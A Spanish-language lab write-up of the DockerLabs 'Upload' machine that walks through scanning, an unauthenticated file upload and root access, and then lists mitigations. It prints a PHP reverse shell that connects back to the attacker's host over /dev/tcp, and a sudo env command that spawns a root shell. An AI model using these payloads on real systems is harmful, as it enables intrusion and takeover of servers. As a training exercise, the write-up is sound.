# Writeup: Upload

- **Máquina:** Upload (DockerLabs)
- **Enlace:** [https://dockerlabs.es/maquinas/87/descargar](https://dockerlabs.es/maquinas/41/descargar)
- **Dificultad:** Fácil
- **Fecha:** 6 de Noviembre 2026

---

## Objetivo
Explotar panel vulnerable de subida de archivos y acceder a ejecución remota de comandos en el server.

---

## Despliegue de la máquina
```bash
$ sudo bash auto_deploy.sh upload.tar
```
<img width="525" height="124" alt="Captura de pantalla (331)" src="https://github.com/user-attachments/assets/6b04c75a-9a72-4f63-b942-5a52bd497ea4" />



Para comprobar que el servicio se encuentre activo se usó `ping`:

```bash
$ ping 172.17.0.2
```
Resultado:
```bash
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.226 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.065 ms
2 packets transmitted, 2 received, 0% packet loss, time 1031ms
```

---

## 1. Reconocimiento
Se realizó escaneo de puertos con `nmap`, revelando un único puerto abierto:

```bash
$ nmap -p- -sCV 172.17.0.2 -o scan_upload.txt
```

```bash
PORT   STATE SERVICE
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Upload here your file
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

Al visitar **http://172.17.0.2** en el navegador, se encontró un panel de carga de archivos. 

<img width="472" height="239" alt="Captura de pantalla (332)" src="https://github.com/user-attachments/assets/2b1027e4-3f84-4bbb-91b6-d62c0499213c" />

--- 

## 2. Identificación de vulnerabilidades
Es un serio fallo en la seguridad que para cargar un archivo no se requiere estar logeado ni realizar cualquier tipo de autenticación, ya que cualquier persona podría desplegar codigo malicioso.

Antes de comenzar con la fase de Explotación, se creó un archivo `.txt` de prueba y se subió al server.

```bash
$ nano prueba.txt
```

<img width="855" height="284" alt="Captura de pantalla (334)" src="https://github.com/user-attachments/assets/f7defd86-17c5-4bbb-bbc6-e15619e26aff" />


Se pudo ver que el archivo subido fue procesado por `upload.php`, lo que significa que el back end se hizo con PHP.



---
## 3. Explotación
### 3.1. Enumeración de web
Se usó `gobuster` para identificar directorios ocultos, obteniendo como resultado el directorio **/uploads** donde se encuentran los archivos subidos.

```bash
$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/big.txt
```

<img width="656" height="299" alt="Captura de pantalla (335)" src="https://github.com/user-attachments/assets/3f683e55-c490-42ed-8d3a-1a0782f050af" />

<img width="404" height="176" alt="Captura de pantalla (336)" src="https://github.com/user-attachments/assets/5a98a7d4-5cdc-4b07-b3c4-9a89cf8e26f9" />



### 3.2. Carga y ejecución de reverse shell
Se creó un nuevo archivo `.php` que contiene las instrucciones para la reverse shell y se cargó al server.

```bash
$ nano reverse_shell.php
```

```bash
 <?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'");
 ?>
```

<img width="404" height="212" alt="Captura de pantalla (338)" src="https://github.com/user-attachments/assets/4d9cfe20-7d8e-41ac-8cc8-bff0818714ce" />


Se dejó a `netcat` escuchando en el puerto **443**. Para activar la reverse shell basta con hacer click en el archivo recien subido y así obtener acceso remoto como **www-data**.

<img width="638" height="186" alt="Captura de pantalla (339)" src="https://github.com/user-attachments/assets/834bddb7-1dfb-4746-9a62-86398854c6c0" />



### 3.3. Escalada de privilegios

Se ejecutó `sudo -l` para ver los privilegios disponibles. 

<img width="747" height="153" alt="Captura de pantalla (340)" src="https://github.com/user-attachments/assets/7675e79c-dbbf-415e-bc1b-a2474cc134f1" />

**www-data** puede ejecutar `/bin/env` como `root` y sin contraseña. Para finalizar con la escalada de privilegios, se utilizó el siguiente comando: 

```bash
sudo -u root /usr/bin/env /bin/sh -p
```

```bash
whoami
root
```

<img width="306" height="106" alt="Captura de pantalla (341)" src="https://github.com/user-attachments/assets/d4554de8-f88f-42eb-bc9d-5ff9f01d3ff2" />


---
## Acciones de mitigación
- **Carga de archivos sin validación**: implementar autenticación previa a la carga de archivos.
- **Escalada de privilegios mediante `/bin/env`**: aplicar principio de menor privilegio, eliminar `/bin/env` de sudoers.
---
